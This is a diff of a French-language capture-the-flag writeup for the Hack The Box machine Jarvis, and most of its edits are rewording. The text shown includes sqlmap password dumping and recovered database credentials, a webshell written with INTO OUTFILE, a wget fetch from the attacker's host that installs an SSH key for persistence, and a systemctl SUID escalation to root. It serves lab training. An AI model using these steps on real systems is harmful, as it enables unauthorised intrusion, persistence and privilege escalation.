@@ -14,7 +14,7 @@ draft: true
 # --- PaperMod / navigation ---
 type: "writeups"
 summary: "Jarvis (HTB Medium) : injection SQL, accès via phpMyAdmin, injection de commandes et escalade avec systemctl SUID." 
-description: "Writeup de Jarvis (HTB Medium) : injection SQL, accès via phpMyAdmin, pivot vers pepper et escalade grâce à systemctl SUID." 
+description: "Writeup de Jarvis (HTB Medium) : injection SQL, accès à phpMyAdmin, pivot de www-data vers pepper et escalade root via systemctl SUID."
 tags: ["Hack The Box","HTB Medium","Web","SQL Injection","sqlmap","phpMyAdmin","Command Injection","sudo","SSH","systemctl","SUID","linux-privesc"]
 categories: ["Mes writeups"]
 
@@ -131,15 +131,13 @@ Aucun templating Hugo dans le corps, pour éviter les erreurs d'archetype.
 -->
 ## Introduction
 
-La machine **Jarvis** de Hack The Box, classée **HTB Medium**, propose une chaîne d’exploitation progressive mêlant injection SQL, compromission d’une interface phpMyAdmin, injection de commandes dans un script Python et détournement d’un binaire SUID.
+La machine **Jarvis** de Hack The Box, classée **HTB Medium**, propose une chaîne d’exploitation progressive mêlant injection SQL, accès à une interface phpMyAdmin, injection de commandes dans un script Python et détournement d’un binaire SUID.
 
-L’exploitation commence par l’identification de cette vulnérabilité, puis par son utilisation pour récupérer des informations sensibles et accéder à l’interface phpMyAdmin. Cet accès permet de déposer un webshell sur le serveur et d’obtenir une première connexion avec les privilèges de l’utilisateur `www-data`.
+L’exploitation commence par l’identification de l’injection SQL, puis par son utilisation pour récupérer des informations sensibles et accéder à l’interface phpMyAdmin. Cet accès permet de déposer un webshell sur le serveur et d’obtenir une première connexion avec les privilèges de l’utilisateur `www-data`.
 
 La progression vers l’utilisateur `pepper` passe ensuite par l’analyse d’un script Python exécutable avec `sudo`. Une injection de commandes dans ce script permet d’exécuter des actions avec les privilèges de `pepper`, puis de mettre en place un accès SSH plus stable.
 
 Enfin, l’escalade de privilèges repose sur une mauvaise configuration du binaire `systemctl`, auquel le bit SUID a été attribué. En créant une unité `systemd` exécutée avec les privilèges de `root`, il devient possible de générer une copie SUID de Bash et de prendre le contrôle complet de la machine.
-
-Cette machine propose ainsi un parcours varié associant injection SQL, exploitation d’une interface d’administration, injection de commandes dans un script Python, gestion d’un accès SSH et détournement d’un binaire SUID.
 
 ---
 
@@ -350,7 +348,7 @@ PORT      STATE         SERVICE
 
 ### Énumération des chemins web
 
-Pour la découverte des chemins web, tu peux utiliser le script dédié {{< script "mon-recoweb" >}}.
+La découverte des chemins web est réalisée avec le script dédié {{< script "mon-recoweb" >}}.
 
 ```bash
 mon-recoweb jarvis.htb
@@ -480,7 +478,7 @@ http://jarvis.htb/wp-forum.phps (CODE:403|SIZE:275)
 
 ### Recherche de vhosts
 
-Enfin, tu peux tester la présence de vhosts à l’aide du script {{< script "mon-subdomains" >}}.
+Enfin, la présence éventuelle de vhosts est vérifiée à l’aide du script {{< script "mon-subdomains" >}}.
 
 ```bash
 === mon-subdomains jarvis.htb START ===
@@ -580,7 +578,7 @@ http://jarvis.htb/room.php?cod=2
 
 Avec cette valeur, l’application affiche correctement les informations de la chambre numéro `2`.
 
-![](jarvis-room-code-2.png)
+![Page de la chambre numéro 2 affichée avec le paramètre cod](jarvis-room-code-2.png)
 
 Avant d’utiliser un outil automatisé, tu modifies manuellement ce paramètre afin d’observer la manière dont il est traité par l’application.
 
@@ -592,7 +590,7 @@ http://jarvis.htb/room.php?cod=2'
 
 Cette fois, la page ne retourne plus les informations de la chambre. 
 
-![](jarvis-room-code-2-apostrophe.png)
+![Réponse de la page room.php après ajout d’une apostrophe au paramètre cod](jarvis-room-code-2-apostrophe.png)
 
 Ce comportement constitue un premier indice : l’apostrophe semble perturber la syntaxe d’une requête SQL construite à partir de la valeur de `cod`. Il ne suffit toutefois pas, à lui seul, pour confirmer une injection SQL.
 
@@ -638,9 +636,7 @@ La requête normale avec `cod=2` et celle contenant la condition vraie `AND 1=1`
 
 Les tailles confirment l’observation visuelle : une condition vraie produit la même réponse que `cod=2`, tandis qu’une condition fausse produit la même réponse qu’une chambre inexistante.
 
-Le serveur semble donc interpréter la condition ajoutée au paramètre `cod`, ce qui justifie maintenant une vérification avec `sqlmap`.
-
-La prochaine étape consiste à utiliser `sqlmap` afin de confirmer automatiquement la vulnérabilité et d’en déterminer plus précisément les caractéristiques.
+Le serveur semble donc interpréter la condition ajoutée au paramètre `cod`. Tu peux maintenant utiliser `sqlmap` pour confirmer automatiquement la vulnérabilité et en déterminer plus précisément les caractéristiques.
 
 #### Confirmation de l’injection avec sqlmap
 
@@ -1008,9 +1004,9 @@ La technique booléenne reste exploitable, mais elle nécessite de reconstruire 
 
 L’injection UNION te permet au contraire de récupérer directement les résultats dans la réponse HTTP. Elle est donc beaucoup plus rapide et tu la privilégies pour la suite de l’exploitation.
 
-### Exploitation de l'injection SQLi Union
+### Exploitation de l'injection SQL Union
 
-#### Recherche des mots de passe MySQL
+#### Récupération du hash et identification du mot de passe MySQL
 
 L’injection UNION étant désormais confirmée, tu l’utilises pour rechercher les mots de passe associés aux comptes MySQL accessibles depuis la session vulnérable.
 
@@ -1033,9 +1029,9 @@ sqlmap \
   --passwords
 ```
 
-L’option `--passwords` demande à `sqlmap` de récupérer les comptes du SGBD et leurs éventuels mots de passe ou hash d’authentification.
+L’option `--passwords` demande à `sqlmap` de récupérer les comptes du SGBD ainsi que leurs éventuels mots de passe ou hashes d’authentification.
 
-Comme le point d’injection UNION est déjà enregistré dans la session, il n’est plus nécessaire d’utiliser `--flush-session`. `sqlmap` peut réutiliser directement la technique précédemment confirmée.
+Comme le point d’injection UNION est déjà enregistré dans la session, il n’est plus nécessaire d’utiliser `--flush-session`, `sqlmap` va réutiliser les informations déjà enregistrées lors des sessions précédentes.
 
 Voici la réponse :
 
@@ -1092,7 +1088,7 @@ database management system users password hashes:
 [*] ending @ 10:34:13 /[date]/
 ```
 
-`sqlmap` réutilise la session enregistrée et reprend directement l’injection UNION déjà confirmée :
+La sortie suivante confirme que `sqlmap` a bien récupéré les informations déjà enregistrées :
 
 ```text
 sqlmap resumed the following injection point(s) from stored session:
@@ -1218,7 +1214,7 @@ $connection=new mysqli('127.0.0.1','DBadmin','imissyou','hotel');
 ?>
 ```
 
-Il confirme donc les paramètres de connexion utilisés par l’application :
+Les deux méthodes utilisées permettent donc d’obtenir les mêmes identifiants MySQL :
 
 ```text
 Serveur         : 127.0.0.1
@@ -1226,8 +1222,6 @@ Utilisateur     : DBadmin
 Mot de passe    : imissyou
 Base de données : hotel
 ```
-
-Le mot de passe `imissyou`, déjà retrouvé par `sqlmap` à partir du hash MySQL, est donc bien celui utilisé par l’application pour se connecter à la base de données.
 
 La technique UNION se montre ici particulièrement efficace : le fichier de `75` octets est récupéré en quelques secondes, alors qu’une extraction en boolean-based blind aurait nécessité de nombreuses requêtes pour reconstruire son contenu caractère par caractère.
 
@@ -1277,7 +1271,7 @@ La requête retourne le résultat suivant :
 GRANT ALL PRIVILEGES ON *.* TO 'DBadmin'@'localhost'
 ```
 
-Le compte `DBadmin` dispose donc de tous les privilèges sur l’ensemble des bases de données et des tables du serveur MySQL.
+Le compte `DBadmin` dispose donc de privilèges étendus sur l’ensemble du serveur MySQL.
 
 Cette configuration confirme qu’il ne s’agit pas d’un simple compte applicatif limité à la base `hotel`. Il possède au contraire des droits administratifs particulièrement étendus.
 
@@ -1324,8 +1318,6 @@ La clause suivante demande à MySQL d’écrire ce contenu dans la racine web :
 ```sql
 INTO OUTFILE '/var/www/html/shell.php'
 ```
-
-La réussite de cette opération dépend à la fois des privilèges MySQL du compte `DBadmin`, de la configuration du serveur et des permissions du compte système qui exécute MySQL.
 
 #### Validation de l’exécution du fichier PHP
 
@@ -1394,11 +1386,13 @@ www-data@jarvis:/var/www/html$
 Tu vérifies l’identité du compte utilisé et le répertoire courant :
 
 ```bash
-whoami
-id
-pwd
+www-data@jarvis:/var/www/html$ whoami
 www-data
+
+www-data@jarvis:/var/www/html$ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+www-data@jarvis:/var/www/html$ pwd
 /var/www/html
 ```
 
@@ -1814,11 +1808,21 @@ La clé privée reste sur Kali. La clé publique doit être placée dans le fich
 /home/pepper/.ssh/authorized_keys
 ```
 
+Pour éviter d’exposer accidentellement la clé privée, tu copies la clé publique dans un répertoire temporaire dédié : 
+
+```bash
+mkdir -p /tmp/jarvis-key-share
+cp pepper_jarvis.pub /tmp/jarvis-key-share/
+cd /tmp/jarvis-key-share
+```
+
 Pour simplifier son transfert, tu démarres un petit serveur HTTP depuis le répertoire contenant la clé publique :
 
 ```bash
 python3 -m http.server 8000
 ```
+
+Ainsi, `pepper_jarvis` reste dans ton répertoire de travail et n’est jamais proposée au téléchargement.
 
 Depuis le reverse shell, tu crées ensuite un script chargé d’installer cette clé. Tu remplaces `10.10.x.x` par l’adresse IP de ton interface VPN `tun0` :
 
@@ -1829,8 +1833,11 @@ cat > /tmp/install_pepper_key.sh <<'EOF'
 mkdir -p /home/pepper/.ssh
 chmod 700 /home/pepper/.ssh
 
-wget -qO /home/pepper/.ssh/authorized_keys \
+wget -qO /tmp/pepper_jarvis.pub \
   http://10.10.x.x:8000/pepper_jarvis.pub
+
+cat /tmp/pepper_jarvis.pub >> /home/pepper/.ssh/authorized_keys
+rm /tmp/pepper_jarvis.pub
 
 chmod 600 /home/pepper/.ssh/authorized_keys
 EOF
@@ -1941,7 +1948,7 @@ getcap -r / 2>/dev/null
 
 La commande ne retourne aucun résultat.
 
-Aucun binaire disposant de capabilities exploitables n’est donc présent sur la machine.
+Aucune capability Linux exploitable n’est donc détectée sur la machine.
 
 ### Recherche des binaires SUID
 
@@ -2009,9 +2016,7 @@ Le `s` à la place du `x` dans les permissions du propriétaire confirme la pré
 
 `systemctl` permet de gérer les services `systemd`, notamment de les démarrer, de les arrêter ou de les activer au démarrage du système.
 
-Comme ce binaire possède ici le bit SUID et appartient à `root`, les services lancés par son intermédiaire s’exécutent avec les privilèges de `root`.
-
-Tu peux donc créer une unité `systemd` à usage unique, y placer une commande de ton choix, puis demander à `systemctl` de l’exécuter en tant que `root`.
+Comme `/bin/systemctl` appartient à `root` et possède ici le bit SUID, tu peux l’utiliser depuis le compte `pepper` pour enregistrer et démarrer une unité `systemd` contenant une commande de ton choix. Celle-ci sera alors exécutée avec les privilèges de `root`.
 
 ### Validation de l’exécution privilégiée
 
@@ -2151,9 +2156,7 @@ Tu dois obtenir une ligne semblable à celle-ci :
 -rwsr-xr-x 1 root root ... /tmp/bash-root
 ```
 
-Le fichier appartient bien à `root`.
-
-Le caractère `s` à la place du `x` dans les permissions du propriétaire confirme que le bit SUID est actif :
+La sortie confirme que le fichier appartient à `root` et que le bit SUID est actif, comme l’indique le caractère `s` dans les permissions du propriétaire :
 
 ```text
 -rwsr-xr-x
